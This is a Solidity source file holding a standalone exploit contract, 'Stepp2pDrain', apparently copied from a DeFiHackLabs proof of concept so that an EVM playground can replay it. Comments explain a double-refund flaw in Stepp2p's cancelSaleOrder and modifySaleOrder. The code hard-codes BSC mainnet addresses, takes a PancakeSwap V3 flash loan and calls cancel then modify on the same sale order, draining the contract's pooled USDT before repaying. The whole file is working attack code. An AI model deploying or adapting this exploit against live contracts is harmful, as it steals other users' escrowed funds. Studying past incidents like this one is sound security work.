// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-07-Stepp2p).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry `ContractTest`
// (attacker == address(this); the PancakeSwap V3 flash callback
// `pancakeV3FlashCallback` lives on the test itself), so there is no standalone
// exploit contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testExploit's body moved into `run()`, plus the flash
// callback) so the playground can deploy it and record run(). Logic and constants
// are copied verbatim from test/Stepp2p_exp.sol.
//
// Root cause: Stepp2p's cancelSaleOrder() and modifySaleOrder() BOTH independently
// refund the sale order's escrowed USDT back to the seller. Calling cancelSaleOrder
// (which refunds and clears part of the order state) followed by modifySaleOrder
// on the SAME saleId (which refunds again, since the check only depends on state
// that cancelSaleOrder didn't fully clear) results in a double-spend: the seller
// receives their own escrowed funds back twice from the contract's real USDT
// balance, funded entirely by other users' pooled sale escrow.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPancakeV3PoolActions {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IStepp2p {
    function createSaleOrder(uint256 _amount) external returns (uint256);
    function cancelSaleOrder(uint256 _saleId) external;
    function modifySaleOrder(uint256 _saleId, uint256 _modifyAmount, bool isPostive) external;
}

contract Stepp2pDrain {
    address constant PANCAKE_V3_USDC_USDT = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb;
    address constant STEPP2P = 0x99855380E5f48Db0a6BABeAe312B80885a816DCe;
    IERC20 constant BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // testExploit(): flash-borrow 50,000 USDT from the PancakeSwap V3 USDC/USDT
    // pool. The callback below does the rest of the attack.
    function run() external {
        bytes memory data = "0x623269464a7178";
        IPancakeV3PoolActions(PANCAKE_V3_USDC_USDT).flash(address(this), 50_000 ether, 0, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 /*fee1*/, bytes calldata /*data*/) external {
        uint256 amount = BSC_USD.balanceOf(STEPP2P);

        BSC_USD.approve(STEPP2P, amount);
        uint256 saleId = IStepp2p(STEPP2P).createSaleOrder(amount);
        // cancelSaleOrder + modifySaleOrder on same saleId both transfer funds — results in double spend.
        IStepp2p(STEPP2P).cancelSaleOrder(saleId);
        IStepp2p(STEPP2P).modifySaleOrder(saleId, amount, false);

        BSC_USD.transfer(PANCAKE_V3_USDC_USDT, 50_000 ether + fee0);
    }

    receive() external payable {}
}
